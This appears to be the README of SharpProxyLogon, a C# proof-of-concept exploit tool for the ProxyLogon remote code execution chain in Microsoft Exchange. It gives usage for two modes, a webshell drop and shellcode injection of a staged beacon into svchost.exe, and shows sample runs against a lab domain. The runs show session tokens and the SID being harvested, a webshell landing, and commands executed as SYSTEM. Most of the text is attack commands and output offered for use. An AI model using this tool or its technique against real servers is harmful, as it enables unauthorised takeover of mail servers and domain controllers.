# SharpProxyLogon

C# POC for the ProxyLogon chained RCE

```
 __ _                        ___                       __
/ _\ |__   __ _ _ __ _ __   / _ \_ __ _____  ___   _  / /  ___   __ _  ___  _ __
\ \| '_ \ / _` | '__| '_ \ / /_)/ '__/ _ \ \/ / | | |/ /  / _ \ / _` |/ _ \| '_ \
_\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | | |
\__/_| |_|\__,_|_|  | .__/\/    |_|  \___/_/\_\\__, \____/\___/ \__, |\___/|_| |_|
                    |_|                        |___/            |___/
@Flangvik

Usage Shell: SharpProxyLogon.exe <targetip> <targetemail>
Usage x64 injection: SharpProxyLogon.exe <targetip> <targetemail> <shellcodepath.bin> <inject-target-full-path>
```

Shellcode injection uses built-in [TikiTorch stub]("https://github.com/rasta-mouse/TikiTorch"), this will spawn, suspend and inject staged_beacon.bin into svchost.exe

```
SharpProxyLogon.exe 192.168.58.111:443 administrator@legitcorp.net C:\Temp\staged_beacon.bin "C:\Windows\System32\svchost.exe"

 __ _                        ___                       __
/ _\ |__   __ _ _ __ _ __   / _ \_ __ _____  ___   _  / /  ___   __ _  ___  _ __
\ \| '_ \ / _` | '__| '_ \ / /_)/ '__/ _ \ \/ / | | |/ /  / _ \ / _` |/ _ \| '_ \
_\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | | |
\__/_| |_|\__,_|_|  | .__/\/    |_|  \___/_/\_\\__, \____/\___/ \__, |\___/|_| |_|
                    |_|                        |___/            |___/
@Flangvik

Usage Shell: SharpProxyLogon.exe <targetip> <targetemail>
Usage x64 injection: SharpProxyLogon.exe <targetip> <targetemail> <shellcodepath.bin> <inject-target-full-path>
[+] Got hostname DC01
[+] Got legacyDN /o=LEGITCORP/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=ae2513b106f343ab8c465ec254b105c6-Administrator
[+] Got mailBoxId 7844b192-ae6a-4a16-afe4-269900d5c40a@legitcorp.net
[+] Got accountSID S-1-5-21-2354578447-2549489838-160590685-500
[+] Patched accountSID-> S-1-5-21-2354578447-2549489838-160590685-500
[+] Got msExchEcpCanary lR_xIbkU4EeRa8k0G_ekSjy7CrzM9dgIeCdYK8sMbRQMUoAQMnEfYvHrvDLT1j2jJMFBrpxnJ1s.
[+] Got aspNETSessionID 0e8da60d-ff97-4748-80f1-5834caeba361
[+] Got OABId 1d2e2d98-c636-43c7-a3a9-8041b545d575
[+] Setting ExternalUrl...
[+] Triggering ResetOABVirtualDirectory...
[+] Shell should have landed, triggering injection
```

Example with classic webshell drop
```
SharpProxyLogon.exe 192.168.58.111:443 administrator@legitcorp.net

 __ _                        ___                       __
/ _\ |__   __ _ _ __ _ __   / _ \_ __ _____  ___   _  / /  ___   __ _  ___  _ __
\ \| '_ \ / _` | '__| '_ \ / /_)/ '__/ _ \ \/ / | | |/ /  / _ \ / _` |/ _ \| '_ \
_\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | | |
\__/_| |_|\__,_|_|  | .__/\/    |_|  \___/_/\_\\__, \____/\___/ \__, |\___/|_| |_|
                    |_|                        |___/            |___/
@Flangvik

Usage Shell: SharpProxyLogon.exe <targetip> <targetemail>
Usage x64 injection: SharpProxyLogon.exe <targetip> <targetemail> <shellcodepath.bin> <inject-target-full-path>
[+] Got hostname DC01
[+] Got legacyDN /o=LEGITCORP/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=ae2513b106f343ab8c465ec254b105c6-Administrator
[+] Got mailBoxId 7844b192-ae6a-4a16-afe4-269900d5c40a@legitcorp.net
[+] Got accountSID S-1-5-21-2354578447-2549489838-160590685-500
[+] Patched accountSID-> S-1-5-21-2354578447-2549489838-160590685-500
[+] Got msExchEcpCanary V7mF62VZA0ay793xWTSE07chwKLM9dgIQolVMbEnWJJkvonIUO8VWm2BZdIklFP35W-mtZnUZ4Y.
[+] Got aspNETSessionID 9028e0b3-e56c-4b33-b0e9-b66ab9ab9067
[+] Got OABId cabf9619-178d-4d3e-84a3-748ec598a477
[+] Setting ExternalUrl...
[+] Triggering ResetOABVirtualDirectory...
[+] Shell should have landed, going semi-interactive
CMD #>whoami
nt authority\system

CMD #>hostname
DC01

CMD #>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::2598:cc98:d369:b6ed%13
   IPv4 Address. . . . . . . . . . . : 192.168.58.111
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.58.2

CMD #>
```